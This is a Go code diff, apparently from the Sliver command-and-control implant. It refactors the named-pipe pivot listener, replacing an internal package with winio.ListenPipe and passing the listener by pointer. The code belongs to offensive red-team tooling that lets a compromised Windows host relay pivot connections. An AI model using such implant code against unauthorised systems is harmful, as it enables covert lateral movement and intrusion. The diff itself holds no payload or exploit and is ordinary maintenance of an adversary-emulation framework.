@@ -29,8 +29,8 @@ import (
 	"time"
 
 	pb "github.com/bishopfox/sliver/protobuf/sliver"
+	"github.com/bishopfox/sliver/sliver/3rdparty/winio"
 	"github.com/bishopfox/sliver/sliver/pivots"
-	"github.com/bishopfox/sliver/sliver/pivots/namedpipe"
 	"github.com/bishopfox/sliver/sliver/priv"
 	"github.com/bishopfox/sliver/sliver/taskrunner"
 	"github.com/bishopfox/sliver/sliver/transports"
@@ -277,7 +277,7 @@ func spawnDllHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
-func nampedPipeAcceptNewConnection(ln *namedpipe.PipeListener, connection *transports.Connection) {
+func nampedPipeAcceptNewConnection(ln *net.Listener, connection *transports.Connection) {
 	hostname, err := os.Hostname()
 	if err != nil {
 		// {{if .Debug}}
@@ -285,9 +285,9 @@ func nampedPipeAcceptNewConnection(ln *namedpipe.PipeListener, connection *trans
 		// {{end}}
 		hostname = "."
 	}
-	namedPipe := strings.ReplaceAll(ln.Addr().String(), ".", hostname)
+	namedPipe := strings.ReplaceAll((*ln).Addr().String(), ".", hostname)
 	for {
-		conn, err := ln.Accept()
+		conn, err := (*ln).Accept()
 		if err != nil {
 			continue
 		}
@@ -379,8 +379,8 @@ func namedPipeListenerHandler(envelope *pb.Envelope, connection *transports.Conn
 		}
 		return
 	}
-	var ln *namedpipe.PipeListener
-	ln, err = namedpipe.Listen("\\\\.\\pipe\\" + namedPipeReq.GetPipeName())
+	var ln net.Listener
+	ln, err = winio.ListenPipe("\\\\.\\pipe\\"+namedPipeReq.GetPipeName(), nil)
 	// {{if .Debug}}
 	log.Printf("Listening on %s", "\\\\.\\pipe\\"+namedPipeReq.GetPipeName())
 	// {{end}}
@@ -400,7 +400,7 @@ func namedPipeListenerHandler(envelope *pb.Envelope, connection *transports.Conn
 		return
 	}
 
-	go nampedPipeAcceptNewConnection(ln, connection)
+	go nampedPipeAcceptNewConnection(&ln, connection)
 
 	namedPipeResp := &pb.NamedPipes{
 		Success: true,
